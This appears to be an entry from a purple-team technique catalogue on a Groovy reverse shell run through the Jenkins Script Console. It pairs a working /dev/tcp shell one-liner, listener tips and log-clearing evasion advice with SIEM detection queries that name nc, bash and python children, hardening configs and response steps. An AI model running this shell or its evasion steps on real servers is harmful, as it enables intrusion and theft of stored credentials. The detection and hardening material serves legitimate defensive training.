examples.label: Catch the Groovy reverse shell on a listener

notes: Paste into the same /script console; the Linux one-liner uses /dev/tcp. On Windows use the ProcessBuilder/socket variant. Start the listener first.

recommended.note: The console access this shell is pasted into.
Stabilize the reverse shell into a full TTY

name: Jenkins - Groovy Reverse Shell
command:
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<lhost>/<lport>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
description: Groovy reverse shell for the Jenkins script console (Linux). A Windows ProcessBuilder variant exists for cmd.exe. Catch it with a netcat listener.

defense.why_it_works: Jenkins' Script Console runs Groovy with full JVM access. Runtime.exec() spawns a bash process and redirects stdin/stdout to a TCP socket, creating an interactive reverse shell back to the attacker.
defense.prerequisites: Access to Jenkins Script Console. Outbound network connectivity from Jenkins server to attacker IP/port.
defense.impact: Fully interactive reverse shell as Jenkins process user. Access to all build artifacts, stored credentials (SSH keys, API tokens, cloud credentials), and any system reachable from Jenkins.
defense.detection: Unusual outbound TCP from Jenkins process to external IP. Jenkins process spawning bash/cmd child. EDR: reverse shell pattern from java process.
defense.artifacts: Network flow: Jenkins server -> attacker IP (reverse shell port) | Process tree: java -> bash -> /bin/bash -i | Jenkins Audit Trail (script execution)
defense.splunk_spl:
index=sysmon EventCode=1 (ParentImage="*w3wp.exe" OR ParentImage="*httpd*" OR ParentImage="*apache*" OR ParentImage="*php-cgi*" OR ParentImage="*php-fpm*" OR ParentImage="*java.exe" OR ParentImage="*tomcat*")
| where match(Image, "(?i)(cmd|powershell|bash|sh|nc|python)")
| table _time, Computer, ParentImage, Image, CommandLine

index=web sourcetype=access_combined (method=POST OR status=500)
| stats count by clientip, uri_path | where count>3
defense.elastic_kql: event.code:"1" AND process.parent.name:(w3wp.exe OR httpd OR apache2 OR php-fpm OR java.exe) AND process.name:(cmd.exe OR powershell.exe OR bash OR sh OR nc OR python*)
defense.sentinel_kql:
DeviceProcessEvents
| where InitiatingProcessFileName in~ ("w3wp.exe","httpd","apache2","php-fpm","php-cgi","java.exe","nginx")
| where FileName in~ ("cmd.exe","powershell.exe","bash","sh","nc","python")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine
| sort by Timestamp desc
// Jenkins Groovy script-console reverse shell - java.exe spawning cmd/sh
defense.prevention: Strict egress firewall on Jenkins server -- deny all outbound except required build dependencies. Restrict Script Console access. Run Jenkins in a container with seccomp/AppArmor blocking raw socket creation.
defense.misconfiguration: Jenkins server has unrestricted outbound network access. Script Console accessible to admin users.
defense.vulnerable_config:
# Jenkins -- Script Console accessible, no egress filter
# /script endpoint enabled (default on all Jenkins installs)
# iptables -- default ACCEPT policy (no egress filtering)
iptables -L OUTPUT  # policy ACCEPT -- all outbound allowed

# Jenkins config.xml -- no script security plugin enforced
<useSecurity>false</useSecurity>  <!-- or security realm with no permissions -->

# Reverse shell possible because outbound TCP unrestricted
defense.secure_config:
# Jenkins -- restrict Script Console access
# /configureSecurity: Script Security Plugin enabled
# Matrix-based security: only admin role gets Overall/Administer
<authorizationStrategy class="hudson.security.ProjectMatrixAuthorizationStrategy">
  <permission>hudson.model.Hudson.Administer:admin</permission>
</authorizationStrategy>

# Egress firewall -- block outbound except approved destinations
iptables -P OUTPUT DROP
iptables -A OUTPUT -d 0.0.0.0/0 -p tcp --dport 443 -j ACCEPT
iptables -A OUTPUT -d 0.0.0.0/0 -p tcp --dport 80  -j ACCEPT
iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
defense.evasion: Run the Groovy script-console command once and avoid persisting a job; use an existing authenticated session; clear build logs that capture the command.

validation.success_criteria: At least one behavioral detection fires within 60 seconds of attack execution
response_steps: Correlate alert with source host, user account, and timestamp
Review PowerShell Script Block / Module Logs, Sysmon, Windows Security Event Log, Web proxy logs for surrounding context (5 min before/after)
Verify whether the activity matches known administrative baselines or change windows
If confirmed malicious, isolate the host and escalate to incident response

variations.label: Windows Groovy reverse shell via Java Socket (Script Console)

explain:
A Groovy reverse shell for the Jenkins script console (Linux):
  Runtime.getRuntime().exec([...])   run a shell command from Groovy
  exec 5<>/dev/tcp/<lhost>/<lport>   open a socket to your listener and pipe a shell over it
Runs as the Jenkins user, calling back to a netcat listener; a Windows ProcessBuilder variant spawns cmd.exe the same way.
